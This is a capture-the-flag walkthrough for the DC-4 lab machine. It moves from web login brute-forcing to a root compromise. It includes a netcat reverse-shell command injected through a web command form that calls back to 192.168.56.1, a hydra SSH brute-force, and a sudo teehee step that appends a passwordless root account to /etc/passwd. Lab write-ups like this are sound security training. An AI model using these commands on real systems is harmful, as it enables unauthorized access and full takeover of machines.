# DC - 4

nmap enumeration

![](../../.gitbook/assets/aaaaaaaaaaaaa%20%281%29.png)

directory discovery

![](../../.gitbook/assets/image%20%2814%29.png)

we have a login page in /login.php

![](../../.gitbook/assets/image%20%282%29.png)

after a bruteforce with burp and rockyou:

username: Admin

 password: happy

![](../../.gitbook/assets/image%20%285%29.png)

click on command

![](../../.gitbook/assets/image%20%284%29.png)

click run and intercept the request with burp

we can see the command sending to the server:

![](../../.gitbook/assets/image%20%281%29.png)

in this case its ls -l the additional + is for encoding.

we can use this to get a shell

change the ls command to this:

```text
nc+192.168.56.1+6666+-e+/bin/bash
```

![](../../.gitbook/assets/image%20%2811%29.png)

run a listener and get a shell:

![](../../.gitbook/assets/image%20%2810%29.png)

![](../../.gitbook/assets/image%20%2819%29.png)

![](../../.gitbook/assets/image%20%2812%29.png)

we have a wordlist of old passwords, try it with hydra for usernames jim, sam and charles

```text
 hydra -L users -P wordlist 192.168.56.165 ssh -vvv -t 4
```

![](../../.gitbook/assets/image%20%2815%29.png)

username: jim

 passsword: jibril04

![](../../.gitbook/assets/image%20%2823%29.png)

![](../../.gitbook/assets/image%20%2820%29.png)

nothing comes out of these files

lets look for other vectors:

![](../../.gitbook/assets/image%20%2813%29.png)

no useful suid/sgid files



![](../../.gitbook/assets/image%20%2817%29.png)

no cron jobs

![](../../.gitbook/assets/image%20%2821%29.png)

lets check the mails:

cat /var/mail/jim

![](../../.gitbook/assets/image%20%287%29.png)

login to charles:

![](../../.gitbook/assets/image%20%2824%29.png)

here we have sudo access:



![](../../.gitbook/assets/image%20%286%29.png)

we can run a binary named teehee without password

![](../../.gitbook/assets/image%20%2818%29.png)

it says that it can:

Copy standard input to each FILE, and also to standard output

#### this means whatever we give \(pipe\) to the binary executable it will append to the specified file as an argument and it is executed with sudo and without password so it can access any file on the system including /etc/shadow and /etc/passwd

so we can add a new entry to /etc/passwd \( a new root user\)

```text
echo "root2::0:0:::/bin/bash" | sudo teehee -a /etc/passwd
```

su root2

![](../../.gitbook/assets/image%20%2816%29.png)

done !



